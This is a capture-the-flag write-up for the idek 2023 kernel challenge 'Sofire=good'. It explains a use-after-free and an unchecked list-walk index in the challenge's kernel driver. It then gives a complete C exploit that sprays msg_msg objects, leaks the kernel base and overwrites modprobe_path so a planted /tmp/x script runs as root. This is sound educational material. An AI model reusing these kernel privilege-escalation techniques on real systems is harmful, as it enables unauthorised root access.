# Idek2023 Sofire=good


# Idek2023 Sofire=good

**Description:**

Author:sofire=bad#6525 

Solfire from PicoCTF2021 was too hard so I decided to create my own version in the kernel instead of the blockchain. Now sofire=good not bad Author's note: Kernel Pwn

7 solves / 497 points

## Analysis

With the help of the source code it is easy to figure out the program. This is just a kernel heap challenge and has no business of blockchain. `chall.ko` has four functions as follows.

```c
#define NFT_RMALL  0x1337
#define NFT_ADD    0xdeadbeef
#define NFT_GET    0xcafebabe
#define NFT_EDIT   0xbabecafe
```

All nodes are maintained using a single linked table with a header node. Here are the relevant data structures.

```c
typedef struct sofirium_head{
    char coin_art[0x70];
    struct sofirium_entry* head;
    int total_nft;
} sofirium_head;

typedef struct sofirium_entry{
    struct sofirium_entry* next;
    char nft[CHUNK_SIZE];
} sofirium_entry;

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;

sofirium_head * head;
```

There are two vulnerable points. 

- In `0x1337`, it will free all nodes including `head` but does not clear the pointer. This causes use-after-free.

  ```c
              next = head->head;
              total_nft= head->total_nft;
              kfree(head);
  
  ```

  

- In `GET` and `EDIT`, it uses  `req.idx` which we can control as the upper limit of the index.

  ```c
              for (int i=0; i < req.idx; i++){
                  debug_print(KERN_INFO "Walked over entry %px", target->next);
                  target = target->next;
              };
  ```

  

The size of `sofirium_entry` is 0x108 allocated in kmalloc-512. We could reuse it after free it. I choose `msg_msg` struct as it has pointer at offset zero. Then I can set `req.idx` bigger than `total_nft` so that I implement out-of-bounds reads. 

```c
struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;        /* message text size */
    struct msg_msgseg *next;
    void *security;        
    /* the actual message follows immediately */
};
```

All the messages we send are chained into `m_list`, which is a two-way circular list. We can read and write data of size 0x100, so we send some messages of smaller size to join the list. When two messages are adjacent on the heap, we can control the pointer of one of them to any other area.

Since there are no restrictions on the `/proc/kallsyms` file in this challenge, we can easily get the kernel address by open it.

Finally, I change one of messages's `msg_msg->m_list->next` to `modprobe ` and change it to `/tmp/x`.

## Exploit

I use `popen` to read the `/proc/kallsyms`, it will create a pipe which will influent heap feng-shui. So I open it early.

```c
#include "./exploit.h" // some header files

#define NFT_RMALL 0x1337
#define NFT_ADD 0xdeadbeef
#define NFT_GET 0xcafebabe
#define NFT_EDIT 0xbabecafe

#define CHUNK_SIZE 0x100

struct list_head {
  struct list_head *next, *prev;
};

struct msg_msg {
  struct list_head m_list;
  long m_type;
  size_t m_ts;    /* message text size */
  void *next;     /* struct msg_msgseg *next; */
  void *security; 
                  /* the actual message follows immediately */
};

typedef struct {
  long mtype;
  char mtext[1];
} msg;

typedef struct sofirium_head {
  char coin_art[0x70];
  struct sofirium_entry *head;
  int total_nft;
} sofirium_head;

typedef struct sofirium_entry {
  struct sofirium_entry *next;
  char nft[CHUNK_SIZE];
} sofirium_entry;

typedef struct request {
  int idx;
  char buffer[CHUNK_SIZE];
} request;

int global_fd = 0;
uint64_t kernheap, kernbase;

void die(const char *msg){
  perror(msg);
  exit(-1);
}

void rmall() {
  request req;
  bzero(&req, sizeof(req));
  int ret = ioctl(global_fd, NFT_RMALL, &req);
  if (ret < 0) {
    die("[!] Failed to rmall");
  }
}

void add(void *data) {
  request req;
  bzero(&req, sizeof(req));
  memcpy(req.buffer, data, sizeof(req.buffer));
  int ret = ioctl(global_fd, NFT_ADD, &req);
  if (ret < 0) {
    die("[!] Failed to add");
  }
}

void get(int idx, void *data) {
  request req;
  bzero(&req, sizeof(req));
  req.idx = idx;
  int ret = ioctl(global_fd, NFT_GET, &req);
  if (ret < 0) {
    die("[!] Failed to get");
  }
  memcpy(data, req.buffer, sizeof(req.buffer));
}

void edit(int idx, void *data) {
  request req;
  bzero(&req, sizeof(req));
  req.idx = idx;
  memcpy(req.buffer, data, sizeof(req.buffer));
  int ret = ioctl(global_fd, NFT_EDIT, &req);
  if (ret < 0) {
    die("[!] Failed to edit");
  }
}

void hexdump(void *data, int size) {
  uint64_t *a = (uint64_t *)data;
  for (int i = 0; i < size / 8; i++) {
    printf("[%02x]: 0x%lx\n", i * 8, a[i]);
  }
}

void send_msg(int id, void *buf, size_t size, int flags) {
  if (msgsnd(id, buf, size, flags) < 0) {
    die("[!] Failed to send msg");
  }
  printf("[+] Send message: 0x%lx\n", size);
}

void get_flag(void){
    system("echo '#!/bin/sh\ncp /flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag >> /tmp/1");
    system("cat /tmp/1");

    exit(0);
}

uint64_t leak() {
  FILE *fp = popen("cat /proc/kallsyms |grep _stext", "r");
  if (fp == NULL) {
    die("[!] Error opening /proc/kallsyms");
  }
  char line[1024];
  bzero(line, 1024);
  char *p;
  fread(&line, 0x10, 0x10, fp);
  p = strchr(line, ' ');
  *p = "\x00";
  return strtoull(line, NULL, 16);
}

int main(int argc, char **argv) {
  global_fd = open("/dev/Sofire", O_NONBLOCK);
  if (global_fd < 0) {
    die("[!] Failed to open /dev/chall");
  }
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid < 0) {
    die("[!] Failed to msgget");
  }
  printf("[+] qid = %d\n", qid);

  kernbase = leak();
  printf("[*] Send message\n");
  msg *message = calloc(1, 0x200 + 8);
  bzero(message, 0x200 + 8);
  message->mtype = 1;
  memset(message->mtext, 'P', 0x200 - 0x30);

  char buf[CHUNK_SIZE];
  memset(buf, 'A', sizeof(buf));

  for (int i = 0; i < 24; i++) {
    add(buf);
  }

  printf("[+] 1 Remove all\n");
  rmall();

  printf("[+] Heap spary\n");
  for (int i = 0; i < 1; i++) {
    send_msg(qid, message, 0x200 - 0x30, 0); // 23
  }
  send_msg(qid, message, 0x40 - 0x30, 0); // 24
  send_msg(qid, message, 0x40 - 0x30, 0); // 25
  send_msg(qid, message, 0x40 - 0x30, 0); // 26
  send_msg(qid, message, 0x40 - 0x30, 0); // 27

  printf("[+] kernbase: 0x%lx\n", kernbase);
  uint64_t modprobe = kernbase + 0x1851400;

  // use 25 change 26's next, 27 is target
  uint64_t save_buf[0x100 / 8];

  get(25, buf); // 23(1d0) - 24(10) - 25(10) - 26(10) - 27(10)
  memcpy(save_buf, buf, sizeof(save_buf));
  hexdump(buf, sizeof(buf));
  save_buf[7] = modprobe - 8;

  edit(25, save_buf);

  bzero(buf, sizeof(buf));
  *(uint64_t *)buf = 0x782f706d742f; // /tmp/x
  edit(27, buf);
  get_flag();

  return 0;
}
```




